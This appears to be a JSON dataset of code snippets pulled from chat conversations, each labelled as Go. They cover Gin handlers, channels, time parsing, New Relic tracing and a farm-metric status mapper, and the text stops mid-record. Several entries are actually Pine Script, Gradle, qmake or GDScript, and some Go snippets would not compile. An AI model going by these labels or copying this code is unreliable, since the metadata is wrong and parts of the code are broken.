    "code": "func LoggerMiddleware() gin.HandlerFunc {\n       return func(c *gin.Context) {\n           startTime := time.Now()\n\n           // 继续处理请求\n           c.Next()\n\n           // 请求结束时，计算请求时间并记录日志\n           duration := time.Since(startTime)\n           log.Printf(\"[INFO] %s %s - %v\", c.Request.Method, c.Request.URL.Path, duration)\n       }\n   }",
    "filename": "116052f3b09c4cf7abf86822125bd2e7_4.go"
  },
  {
    "conversation_hash": "116052f3b09c4cf7abf86822125bd2e7",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "r.GET(\"/json\", func(c *gin.Context) {\n       data := map[string]interface{}{\n           \"name\": \"John\",\n           \"age\":  25,\n       }\n       c.JSON(200, data)\n   })",
    "filename": "116052f3b09c4cf7abf86822125bd2e7_6.go"
  },
  {
    "conversation_hash": "116052f3b09c4cf7abf86822125bd2e7",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "r.POST(\"/upload\", func(c *gin.Context) {\n       file, err := c.FormFile(\"file\")\n       if err != nil {\n           c.String(http.StatusBadRequest, \"Error when receiving file\")\n           return\n       }\n       err = c.SaveUploadedFile(file, \"uploads/\"+file.Filename)\n       if err != nil {\n           c.String(http.StatusInternalServerError, \"Error when saving file\")\n           return\n       }\n       c.String(http.StatusOK, \"File uploaded successfully\")\n   })",
    "filename": "116052f3b09c4cf7abf86822125bd2e7_7.go"
  },
  {
    "conversation_hash": "b56583e916c71881934aeca6ccfef0c2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"Toggle Buy Condition Example\", overlay=true)\n\n// Define the input variable for the toggle\nvar bool enable_buy = input(true, \"Enable Buy Condition\")\n \n// Define the buy condition\nbuy_condition = enable_buy and close > open\n\n// Plot the buy condition for visualization\nplotshape(buy_condition, style=shape.arrowup, location=location.belowbar, color=color.green, size=size.small)",
    "filename": "b56583e916c71881934aeca6ccfef0c2_0.go"
  },
  {
    "conversation_hash": "5e037258c4b74ffe5d2087ec5ab6b5ca",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// build.gradle\n \next {\n    versiones = [\n        \"junit\": \"4.12\"\n    ]\n \n    configuraciones = [\n        miConfiguracion: [\n            \"commons-io:commons-io:2.4\",\n            \"org.apache.commons:commons-lang3:3.4\",\n            \"commons-collections:commons-collections:3.2.2\"\n        ]\n    ]\n}",
    "filename": "5e037258c4b74ffe5d2087ec5ab6b5ca_0.go"
  },
  {
    "conversation_hash": "84a07ab82c280c8718ccdd530a1dc55a",
    "code_index": 16,
    "language": "Go",
    "libraries": [],
    "code": "TEMPLATE = lib\nQT = sql\nCONFIG += plugin\nTARGET = $$qtLibraryTarget(qsqlsqleet)\nDESTDIR = $$[QT_INSTALL_PLUGINS/sqldrivers]\n\nINCLUDEPATH += $$PWD\nSOURCES += $$PWD/{qsqlite.cpp,sqleet/sqlite3.c}\nHEADERS += $$PWD/{qsqlite.h,sqleet/sqlite3.h,qsqlcachedresult_p.h}\n\nPLUGIN_TYPE = sqldrivers\nPLUGIN_CLASS_NAME = QSQLiteWithOptionsDriverPlugin\n\nOTHER_FILES += sqleet.json\n\nexists($$[QT_INSTALL_PLUGINS/sqldrivers]) {\n    target.path = $$[QT_INSTALL_PLUGINS/sqldrivers]\n} else {\n    target.path = $$[QT_INSTALL_PLUGINS]/sqldrivers\n}\nINSTALLS += target",
    "filename": "84a07ab82c280c8718ccdd530a1dc55a_16.go"
  },
  {
    "conversation_hash": "84a07ab82c280c8718ccdd530a1dc55a",
    "code_index": 24,
    "language": "Go",
    "libraries": [],
    "code": "TEMPLATE = lib\nQT = sql\nCONFIG += plugin\nTARGET = $$qtLibraryTarget(qsqlsqleet)\nDESTDIR = $$[QT_INSTALL_PLUGINS/sqldrivers]\n\nINCLUDEPATH += $$PWD\nSOURCES += $$PWD/{qsqlsqleet.cpp,sqlite3.c}\nHEADERS += $$PWD/{qsqlsqleet.h,sqlite3.h,qsqlcachedresult_p.h}\n\nPLUGIN_TYPE = sqldrivers\nPLUGIN_CLASS_NAME = QSQLiteDriverPlugin_sqleet\n\nOTHER_FILES += sqleet.json\n\nexists($$[QT_INSTALL_PLUGINS/sqldrivers]) {\n    target.path = $$[QT_INSTALL_PLUGINS/sqldrivers]\n} else {\n    target.path = $$[QT_INSTALL_PLUGINS]/sqldrivers\n}\nINSTALLS += target",
    "filename": "84a07ab82c280c8718ccdd530a1dc55a_24.go"
  },
  {
    "conversation_hash": "84a07ab82c280c8718ccdd530a1dc55a",
    "code_index": 32,
    "language": "Go",
    "libraries": [],
    "code": "TEMPLATE = lib\nQT = sql\nCONFIG += plugin\nTARGET = $$qtLibraryTarget(qsqlsqleet)\nDESTDIR = $$[QT_INSTALL_PLUGINS]/sqldrivers\n\nINCLUDEPATH += $$PWD\nSOURCES += $$PWD/{qsqlsqleet.cpp,sqlite3.c}\nHEADERS += $$PWD/{qsqlsqleet.h,sqlite3.h,qsqlcachedresult_p.h}\n\nPLUGIN_TYPE = sqldrivers\nPLUGIN_CLASS_NAME = QSQLiteDriverPlugin_sqleet\n\nOTHER_FILES += sqleet.json\n\nexists($$[QT_INSTALL_PLUGINS]/sqldrivers) {\n    target.path = $$[QT_INSTALL_PLUGINS]/sqldrivers\n} else {\n    target.path = $$[QT_INSTALL_PLUGINS]/sqldrivers\n}\nINSTALLS += target",
    "filename": "84a07ab82c280c8718ccdd530a1dc55a_32.go"
  },
  {
    "conversation_hash": "e9069756c48884c002accd3e7a1c7ef0",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "QT += core\nQT -= gui\n\nCONFIG += c++11 console\nCONFIG -= app_bundle\n\nSOURCES += \\\n        main.c \\\n        shell.c \\\n        sqleet.c\n\nHEADERS += \\\n        sqleet.h\n\nLIBS += $$PWD/../../sqlite/libsqlite3.a\n\nunix {\n    target.path = /opt/plugins/sqldrivers\n    INSTALLS += target\n}",
    "filename": "e9069756c48884c002accd3e7a1c7ef0_0.go"
  },
  {
    "conversation_hash": "5da4c6d46fb3b3c6030beb7a0bd7442f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"net\"\n\n\t\"google.golang.org/grpc\"\n\t\"github.com/myproject/samplepb\"\n)\n\ntype myService struct{}\n\nfunc (s *myService) MyFunction(ctx context.Context, request *samplepb.MyRequest) (*samplepb.MyResponse, error) {\n\t//Handle the request and return response\n}\n\nfunc main() {\n\tlis, err := net.Listen(\"tcp\", \":50051\")\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to listen: %v\", err)\n\t}\n\n\ts := grpc.NewServer()\n\tsamplepb.RegisterMyServiceServer(s, &myService{})\n\n\tif err := s.Serve(lis); err != nil {\n\t\tlog.Fatalf(\"Failed to serve: %v\", err)\n\t}\n}",
    "filename": "5da4c6d46fb3b3c6030beb7a0bd7442f_0.go"
  },
  {
    "conversation_hash": "3315f9d0e2bfacba84ac2957a6346a75",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "func MetricReadStatusMapper(compareData map[string]interface{}, sReference interface{}, dataOld string, userReadStatus string, dataNew string) string {\n\n    var sReferences []map[string]interface{}\n    json.Unmarshal([]byte(sReference.(string)), &sReferences)\n\n    split := strings.Split(userReadStatus, \",\")\n    for _, value := range sReferences{\n        key := ShrimpEstateMetricKey[value[\"key\"].(string)]\n\n        statusDataOld := \"good\"\n        statusDataNew := \"wary\"\n\n        keyIndex := key.(int)\n        splitDataOld := strings.Split(dataOld, \",\")[keyIndex]\n        for _, sReference := range sReferences {\n            if splitDataOld == sReference[\"key\"].(string) {\n                // ... (code as before) ...\n            }\n        }\n\n        splitDataNew := strings.Split(dataNew, \",\")[keyIndex]\n        for _, sReference := range sReferences {\n            if splitDataNew == sReference[\"key\"].(string) {\n                // ... (code as before) ...\n            }\n        }\n\n        if statusDataOld != statusDataNew {\n            split[keyIndex] = \"false\"\n        }\n    }\n\n    join := strings.Join(split, \",\")\n    userReadStatus = join\n    return userReadStatus\n}\n\n// ... (other code as before) ...\n\n// line 611\nif query.Data == nil {\n    dataReadStatus = strings.Repeat(\"false,\", 9) + \"false\"\n} else {\n    hasData := query.Data.(map[string]interface{})\n    dataReadStatus = MetricReadStatusMapper(compareData, compareData[\"smartfarm_references\"], hasData[\"value\"].(string), dataReadStatus, data[\"data\"].(string))\n}",
    "filename": "3315f9d0e2bfacba84ac2957a6346a75_6.go"
  },
  {
    "conversation_hash": "3315f9d0e2bfacba84ac2957a6346a75",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"strconv\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/google/uuid\"\n)",
    "filename": "3315f9d0e2bfacba84ac2957a6346a75_7.go"
  },
  {
    "conversation_hash": "3315f9d0e2bfacba84ac2957a6346a75",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "splitDataOld_list := strings.Split(dataOld, \",\")\nif len(splitDataOld_list) > keyIndex {\n    splitDataOld = splitDataOld_list[keyIndex]\n} else {\n    // handle the case when there are not enough elements\n}",
    "filename": "3315f9d0e2bfacba84ac2957a6346a75_10.go"
  },
  {
    "conversation_hash": "f05b50428b59126e5fa9e67548605349",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type Address struct {\n    Street string\n    City   string\n    State  string\n    Zip    int\n}\n\ntype Person struct {\n    FirstName string\n    LastName  string\n    Age       int\n    Address   Address\n}",
    "filename": "f05b50428b59126e5fa9e67548605349_0.go"
  },
  {
    "conversation_hash": "f05b50428b59126e5fa9e67548605349",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "p := Person{\n    FirstName: \"John\",\n    LastName:  \"Doe\",\n    Age:       30,\n    Address: Address{\n        Street: \"123 Main St\",\n        City:   \"Anytown\",\n        State:  \"CA\",\n        Zip:    12345,\n    },\n}\n\nfmt.Println(p.FirstName)\nfmt.Println(p.Address.City)",
    "filename": "f05b50428b59126e5fa9e67548605349_1.go"
  },
  {
    "conversation_hash": "f05b50428b59126e5fa9e67548605349",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "type Person struct {\n    FirstName string\n    LastName  string\n    Age       int\n}",
    "filename": "f05b50428b59126e5fa9e67548605349_3.go"
  },
  {
    "conversation_hash": "f05b50428b59126e5fa9e67548605349",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "type Address struct {\n    Street string\n    City   string\n    State  string\n    Zip    int\n}\n\ntype Person struct {\n    FirstName string\n    LastName  string\n    Age       int\n    Address\n}",
    "filename": "f05b50428b59126e5fa9e67548605349_4.go"
  },
  {
    "conversation_hash": "f05b50428b59126e5fa9e67548605349",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "p := Person{\n    FirstName: \"John\",\n    LastName:  \"Doe\",\n    Age:       30,\n    Address: Address{\n        Street: \"123 Main St\",\n        City:   \"Anytown\",\n        State:  \"CA\",\n        Zip:    12345,\n    },\n}\n\nfmt.Println(p.FirstName)\nfmt.Println(p.City)",
    "filename": "f05b50428b59126e5fa9e67548605349_5.go"
  },
  {
    "conversation_hash": "a2a88ef0c4d3b6d28e44cd57b81c9d18",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    messages := make(chan string)\n\n    go func() {\n        messages <- \"hello\"\n    }()\n    \n    msg := <-messages\n    fmt.Println(msg)\n}",
    "filename": "a2a88ef0c4d3b6d28e44cd57b81c9d18_0.go"
  },
  {
    "conversation_hash": "a2a88ef0c4d3b6d28e44cd57b81c9d18",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    messages := make(chan string, 2)\n\n    messages <- \"hello\"\n    messages <- \"world\"\n    \n    fmt.Println(<-messages)\n    fmt.Println(<-messages)\n}",
    "filename": "a2a88ef0c4d3b6d28e44cd57b81c9d18_1.go"
  },
  {
    "conversation_hash": "a2a88ef0c4d3b6d28e44cd57b81c9d18",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func fibonacci(c, quit chan int) {\n    x, y := 0, 1\n    for {\n        select {\n        case c <- x:\n            x, y = y, x+y\n        case <-quit:\n            fmt.Println(\"quit\")\n            return\n        }\n    }\n}\n\nfunc main() {\n    c := make(chan int)\n    quit := make(chan int)\n    go func() {\n        for i := 0; i < 10; i++ {\n            fmt.Println(<-c)\n        }\n        quit <- 0\n    }()\n    fibonacci(c, quit)\n}",
    "filename": "a2a88ef0c4d3b6d28e44cd57b81c9d18_2.go"
  },
  {
    "conversation_hash": "a2a88ef0c4d3b6d28e44cd57b81c9d18",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    defer fmt.Println(\"go\")\n    fmt.Println(\"hello\")\n    fmt.Println(\"world\")\n}",
    "filename": "a2a88ef0c4d3b6d28e44cd57b81c9d18_3.go"
  },
  {
    "conversation_hash": "a2a88ef0c4d3b6d28e44cd57b81c9d18",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func safeDivide(x, y int) (result int, err error) {\n    defer func() {\n        if r := recover(); r != nil {\n            err = fmt.Errorf(\"runtime error: %v\", r)\n        }\n    }()\n    result = x / y\n    return result, err\n}\n\nfunc main() {\n    result, err := safeDivide(6, 0)\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    fmt.Println(result)\n}",
    "filename": "a2a88ef0c4d3b6d28e44cd57b81c9d18_4.go"
  },
  {
    "conversation_hash": "f1364ac87b556236a1d7a9dbc06749c3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func MetricReadStatusMapper(sReference interface{}, dataOld string, dataNew string) string {\n\n\tvar sReferences []map[string]interface{}\n\tjson.Unmarshal([]byte(sReference.(string)), &sReferences)\n\tuserReadStatus := \"true,true,true,true,true,true,true,true,true\"\n\n\tsplit := strings.Split(userReadStatus, \",\")\n\n\tfor _, value := range sReferences {\n\t\tkey := ShrimpEstateMetricKey[value[\"key\"].(string)]\n\n\t\tkeyIndex := key.(int)\n\t\ttempDataOld := strings.Split(dataOld, \",\")[keyIndex]\n\t\ttempDataNew := strings.Split(dataNew, \",\")[keyIndex]\n\n\t\tstatusDataOld := \"good\"\n\t\tstatusDataNew := \"wary\"\n\n\t\tfor _, sReference := range sReferences {\n\t\t\tif key == sReference[\"key\"].(string) {\n\t\t\t\tvar reference []map[string]interface{}\n\t\t\t\tbyteReference, _ := json.Marshal(sReference[\"reference\"])\n\t\t\t\tjson.Unmarshal(byteReference, &reference)\n\n\t\t\t\tchecker := false\n\t\t\t\tfor _, refValue := range reference {\n\t\t\t\t\tvar parameter []map[string]interface{}\n\t\t\t\t\tbyteParameter, _ := json.Marshal(refValue[\"parameter\"])\n\t\t\t\t\tjson.Unmarshal(byteParameter, &parameter)\n\n\t\t\t\t\tfor _, parValue := range parameter {\n\t\t\t\t\t\tconvRaw, _ := strconv.ParseFloat(sReference[\"raw_value\"].(string), 64)\n\t\t\t\t\t\tif !checker {\n\t\t\t\t\t\t\tif tempDataOld == refValue[\"status\"].(string) {\n\t\t\t\t\t\t\t\tstatusDataOld = refValue[\"status\"].(string)\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif tempDataNew == refValue[\"status\"].(string) {\n\t\t\t\t\t\t\t\tstatusDataNew = refValue[\"status\"].(string)\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tswitch parValue[\"type\"] {\n\t\t\t\t\t\t\tcase \"greater-than\":\n\t\t\t\t\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\t\t\t\t\tif conv < convRaw {\n\t\t\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tcase \"lower-than\":\n\t\t\t\t\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\t\t\t\t\tif conv > convRaw {\n\t\t\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tcase \"between\":\n\t\t\t\t\t\t\t\tsplitVal := strings.Split(parValue[\"value\"].(string), \"-\")\n\t\t\t\t\t\t\t\tfConv, _ := strconv.ParseFloat(splitVal[0], 64)\n\t\t\t\t\t\t\t\tsConv, _ := strconv.ParseFloat(splitVal[1], 64)\n\t\t\t\t\t\t\t\tif fConv <= convRaw && sConv >= convRaw {\n\t\t\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif statusDataOld != statusDataNew {\n\t\t\tsplit[keyIndex] = \"false\"\n\t\t}\n\t}\n\n\tjoin := strings.Join(split, \",\")\n\tuserReadStatus = join\n\treturn userReadStatus\n}",
    "filename": "f1364ac87b556236a1d7a9dbc06749c3_0.go"
  },
  {
    "conversation_hash": "48a8cfe5ad5d299ff01f5763663ec973",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc main() {\n    str := \"2022-01-10 15:30:23\"\n    layout := \"2006-01-02 15:04:05\" // 必须指定时间格式\n    t, err := time.Parse(layout, str)\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    fmt.Println(t)\n}",
    "filename": "48a8cfe5ad5d299ff01f5763663ec973_0.go"
  },
  {
    "conversation_hash": "48a8cfe5ad5d299ff01f5763663ec973",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"strconv\"\n    \"time\"\n)\n\nfunc main() {\n    str := \"1641901223\" // 时间戳字符串\n    timestamp, err := strconv.ParseInt(str, 10, 64)\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    t := time.Unix(timestamp, 0)\n    fmt.Println(t)\n}",
    "filename": "48a8cfe5ad5d299ff01f5763663ec973_1.go"
  },
  {
    "conversation_hash": "48a8cfe5ad5d299ff01f5763663ec973",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc main() {\n    timestamp := time.Now().Unix()\n    fmt.Println(timestamp)\n}",
    "filename": "48a8cfe5ad5d299ff01f5763663ec973_2.go"
  },
  {
    "conversation_hash": "8175d1dfd5536cb405fda1078147bf01",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc main() {\n\t// 准备JSON数据\n\tdata := map[string]string{\n\t\t\"name\":  \"jerry\",\n\t\t\"email\": \"jerry@example.com\",\n\t}\n\tjsonData, err := json.Marshal(data)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\n\t// 构建请求\n\turl := \"https://example.com/api/users\"\n\treq, err := http.NewRequest(\"POST\", url, bytes.NewBuffer(jsonData))\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\treq.Header.Set(\"Content-Type\", \"application/json\")\n\n\t// 发送请求\n\tclient := &http.Client{}\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\n\t// 处理响应\n\tif resp.StatusCode == http.StatusOK {\n\t\tfmt.Println(\"Request succeeded\")\n\t} else {\n\t\tfmt.Printf(\"Request failed with status code:%d\", resp.StatusCode)\n\t}\n}",
    "filename": "8175d1dfd5536cb405fda1078147bf01_3.go"
  },
  {
    "conversation_hash": "484028e1434ef569c41204ba30355f24",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func _process(delta):\n    # Получаем позицию цели\n    var target_position = $TargetNode.global_position\n    \n    # Устанавливаем расстояние, на котором должен находиться объект \n    var distance = 50 \n    \n    # Получаем текущую позицию объекта\n    var current_position = global_position\n    \n    # Вычисляем новую позицию, на которую должен переместиться объект\n    var new_position = current_position.move_toward(target_position, distance)\n    \n    # Обновляем позицию объекта\n    global_position = new_position",
    "filename": "484028e1434ef569c41204ba30355f24_0.go"
  },
  {
    "conversation_hash": "834bfc75c79272102d90470454cf40db",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"log\"\n\n    \"github.com/newrelic/go-agent/v3/newrelic\"\n)\n\nfunc main() {\n    cfg := newrelic.NewConfig(\"Example App\", \"YOUR_NEW_RELIC_LICENSE_KEY\")\n    app, err := newrelic.NewApplication(cfg)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // Start a transaction\n    txn := app.StartTransaction(\"my-transaction\")\n\n    // Do some work\n    fmt.Println(\"Hello World!\")\n\n    // End the transaction\n    txn.End()\n}",
    "filename": "834bfc75c79272102d90470454cf40db_1.go"
  },
  {
    "conversation_hash": "834bfc75c79272102d90470454cf40db",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"context\"\n\n    \"go.opentelemetry.io/otel\"\n    \"go.opentelemetry.io/otel/exporters/trace/newrelic\"\n    \"go.opentelemetry.io/otel/sdk/trace\"\n)\n\nfunc main() {\n    // Initialize the New Relic agent\n    cfg := newrelic.NewConfig(\"Example App\", \"YOUR_NEW_RELIC_LICENSE_KEY\")\n    app, err := newrelic.NewApplication(cfg)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // Create a New Relic exporter\n    exporter, err := newrelic.NewExporter(\n        newrelic.ConfigAPIKey(\"YOUR_NEW_RELIC_LICENSE_KEY\"),\n        newrelic.ConfigServiceName(\"Example App\"),\n    )\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // Wrap the New Relic exporter with a TracerProvider\n    tracerProvider := trace.NewTracerProvider(\n        trace.WithBatcher(exporter),\n        trace.WithSampler(trace.AlwaysSample()),\n    )\n\n    // Register the tracer provider with the global OpenTelemetry API\n    otel.SetTracerProvider(tracerProvider)\n\n    // Start a transaction\n    ctx, span := otel.Tracer(\"example.com/hello\").Start(context.Background(), \"my-span\")\n    defer span.End()\n\n    // Do some work\n    fmt.Println(\"Hello World!\")\n}",
    "filename": "834bfc75c79272102d90470454cf40db_2.go"
  },
  {
    "conversation_hash": "834bfc75c79272102d90470454cf40db",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n   \n   import (\n       \"context\"\n       \"log\"\n       \"time\"\n       \n       \"github.com/newrelic/newrelic-telemetry-sdk-go/telemetry\"\n       \"go.opentelemetry.io/otel\"\n       \"go.opentelemetry.io/otel/exporters/trace/newrelic\"\n       \"go.opentelemetry.io/otel/sdk/trace\"\n   )\n   \n   func main() {\n       // Initialize the New Relic exporter\n       cfg := telemetry.ConfigAPIKey(\"YOUR_API_KEY\")\n       exp, err := newrelic.NewExporter(cfg)\n       if err != nil {\n           log.Fatal(err)\n       }\n       \n       // Create a TracerProvider with the New Relic exporter\n       tp := trace.NewTracerProvider(trace.WithSyncer(exp))\n       \n       // Register the TracerProvider with the global OpenTelemetry API\n       otel.SetTracerProvider(tp)\n       \n       // Create a tracer\n       tracer := otel.Tracer(\"my-tracer\")\n       \n       // Start a span\n       ctx, span := tracer.Start(context.Background(), \"my-span\")\n       \n       // Do some work\n       time.Sleep(1 * time.Second)\n       \n       // End the span\n       span.End()\n       \n       // Shutdown the TracerProvider to flush any remaining spans\n       tp.Shutdown(context.Background())\n   }",
    "filename": "834bfc75c79272102d90470454cf40db_5.go"
  },
  {
    "conversation_hash": "834bfc75c79272102d90470454cf40db",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n   \n   import (\n       \"fmt\"\n       \"net/http\"\n       \n       newrelic \"github.com/newrelic/go-agent\"\n       \"go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp\"\n       \"go.opentelemetry.io/otel\"\n       \"go.opentelemetry.io/otel/exporters/trace/newrelic\"\n       \"go.opentelemetry.io/otel/sdk/trace\"\n   )\n   \n   // Create a New Relic application\n   var newrelicApp newrelic.Application\n   \n   func main() {\n       // Initialize the New Relic agent\n       cfg := newrelic.NewConfig(\"Example App\", \"YOUR_NEW_RELIC_LICENSE_KEY\")\n       var err error\n       newrelicApp, err = newrelic.NewApplication(cfg)\n       if err != nil {\n           fmt.Println(\"Error initializing New Relic:\", err)\n           return\n       }\n       defer newrelicApp.Shutdown(1 * time.Second)\n   \n       // Create a New Relic exporter\n       exporter, err := newrelic.NewExporter(\n           newrelic.ConfigAPIKey(\"YOUR_NEW_RELIC_LICENSE_KEY\"),\n           newrelic.ConfigServiceName(\"Example App\"),\n       )\n       if err != nil {\n           fmt.Println(\"Error creating New Relic exporter:\", err)\n           return\n       }\n       \n       // Create a TracerProvider with the New Relic exporter\n       tp := trace.NewTracerProvider(\n           trace.WithSampler(trace.AlwaysSample()),\n           trace.WithBatcher(exporter),\n       )\n       \n       // Register the TracerProvider with the global OpenTelemetry API\n       otel.SetTracerProvider(tp)\n       \n       // Register the New Relic propagator to enable correlation\n       otel.SetTextMapPropagator(newrelic.NewPropagator(nil))\n       \n       // Wrap the default HTTP client with the OpenTelemetry transport\n       httpClient := &http.Client{\n           Transport: otelhttp.NewTransport(http.DefaultTransport),\n       }\n       \n       // Instrument an HTTP request with OpenTelemetry\n       req, err := http.NewRequest(\"GET\", \"https://www.example.com/\", nil)\n       if err != nil {\n           fmt.Println(\"Error creating HTTP request:\", err)\n           return\n       }\n       req = req.WithContext(otel.ContextWithSpan(req.Context(), otel.Tracer(\"http-client\").Start(req.Context(), \"GET /\")))\n       _, err = httpClient.Do(req)\n       if err != nil {\n           fmt.Println(\"Error executing HTTP request:\", err)\n           return\n       }\n   }",
    "filename": "834bfc75c79272102d90470454cf40db_8.go"
  },
  {
    "conversation_hash": "78e83defc1026508dbdcf8a9290889cb",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func getStatusData(sReference map[string]interface{}, data string) string {\n\tvar reference []map[string]interface{}\n\tbyteReference, _ := json.Marshal(sReference[\"reference\"])\n\tjson.Unmarshal(byteReference, &reference)\n\n\tfor _, refValue := range reference {\n\t\tvar parameter []map[string]interface{}\n\t\tbyteParameter, _ := json.Marshal(refValue[\"parameter\"])\n\t\tjson.Unmarshal(byteParameter, &parameter)\n\n\t\tchecker := true\n\t\tfor _, parValue := range parameter {\n\t\t\tconvRaw, _ := strconv.ParseFloat(data, 64)\n\t\t\tswitch parValue[\"type\"] {\n\t\t\tcase \"greater-than\":\n\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\tchecker = checker && (convRaw > conv)\n\t\t\tcase \"lower-than\":\n\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\tchecker = checker && (convRaw < conv)\n\t\t\tcase \"between\":\n\t\t\t\tsplitVal := strings.Split(parValue[\"value\"].(string), \"-\")\n\t\t\t\tfConv, _ := strconv.ParseFloat(splitVal[0], 64)\n\t\t\t\tsConv, _ := strconv.ParseFloat(splitVal[1], 64)\n\t\t\t\tchecker = checker && (fConv <= convRaw && sConv >= convRaw)\n\t\t\t}\n\t\t}\n\n\t\tif checker {\n\t\t\treturn refValue[\"status\"].(string)\n\t\t}\n\t}\n\n\treturn \"unknown\"\n}\n\nfunc MetricReadStatusMapper(sReference interface{}, dataOld string, dataNew string) string {\n\tvar sReferences []map[string]interface{}\n\tjson.Unmarshal([]byte(sReference.(string)), &sReferences)\n\tuserReadStatus := \"true,true,true,true,true,true,true,true,true\"\n\n\tdataOldSplit := strings.Split(dataOld, \",\")\n\tdataNewSplit := strings.Split(dataNew, \",\")\n\tstatusSplit := strings.Split(userReadStatus, \",\")\n\n\tfor index, value := range sReferences {\n\t\tkey := ShrimpEstateMetricKey[value[\"key\"].(string)]\n\t\tkeyIndex := key.(int)\n\n\t\tstatusDataOld := getStatusData(value, dataOldSplit[keyIndex])\n\t\tstatusDataNew := getStatusData(value, dataNewSplit[keyIndex])\n\n\t\tif statusDataOld != statusDataNew {\n\t\t\tstatusSplit[keyIndex] = \"false\"\n\t\t}\n\t}\n\n\tjoin := strings.Join(statusSplit, \",\")\n\tuserReadStatus = join\n\treturn userReadStatus\n}",
    "filename": "78e83defc1026508dbdcf8a9290889cb_0.go"
  },
  {
    "conversation_hash": "78e83defc1026508dbdcf8a9290889cb",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func getStatusData(sReference map[string]interface{}, data string) string {\n\tvar reference []map[string]interface{}\n\tbyteReference, _ := json.Marshal(sReference[\"reference\"])\n\tjson.Unmarshal(byteReference, &reference)\n\n\tfor _, refValue := range reference {\n\t\tvar parameter []map[string]interface{}\n\t\tbyteParameter, _ := json.Marshal(refValue[\"parameter\"])\n\t\tjson.Unmarshal(byteParameter, &parameter)\n\n\t\tchecker := true\n\t\tfor _, parValue := range parameter {\n\t\t\tconvRaw, _ := strconv.ParseFloat(data, 64)\n\t\t\tswitch parValue[\"type\"] {\n\t\t\tcase \"greater-than\":\n\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\tchecker = checker && (convRaw > conv)\n\t\t\tcase \"lower-than\":\n\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\tchecker = checker && (convRaw < conv)\n\t\t\tcase \"between\":\n\t\t\t\tsplitVal := strings.Split(parValue[\"value\"].(string), \"-\")\n\t\t\t\tfConv, _ := 